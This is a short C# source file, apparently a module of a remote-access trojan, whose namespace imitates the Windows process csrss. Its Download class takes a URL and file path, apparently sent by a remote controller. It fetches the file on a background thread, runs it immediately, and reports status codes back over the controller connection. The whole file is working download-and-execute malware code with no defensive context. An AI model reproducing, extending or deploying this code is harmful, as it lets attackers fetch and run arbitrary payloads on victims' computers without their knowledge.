using System.Diagnostics;
using System.Net;
using System.Threading;

namespace MI_CSRSS;

internal class Download
{
	private static string _url;

	private static string _path;

	private static Thread _thread;

	private static void started()
	{
		Connection.SendConnByte("STU~001");
	}

	private static void executed()
	{
		Connection.SendConnByte("STU~002");
	}

	private static void success()
	{
		Connection.SendConnByte("STU~003");
	}

	private static void failed()
	{
		Connection.SendConnByte("STU~004");
	}

	public static void wgetfile(string url, string path)
	{
		Connection.BusyWithCmds = true;
		started();
		_url = url;
		_path = path;
		_thread = new Thread(ThreadDownloadFile);
		_thread.Start();
	}

	private static void ThreadDownloadFile()
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(_url, _path);
			Process.Start(_path);
			success();
		}
		catch
		{
			failed();
		}
		Thread.Sleep(5000);
		Connection.SendConnByte("STU~000");
		Connection.BusyWithCmds = false;
	}
}
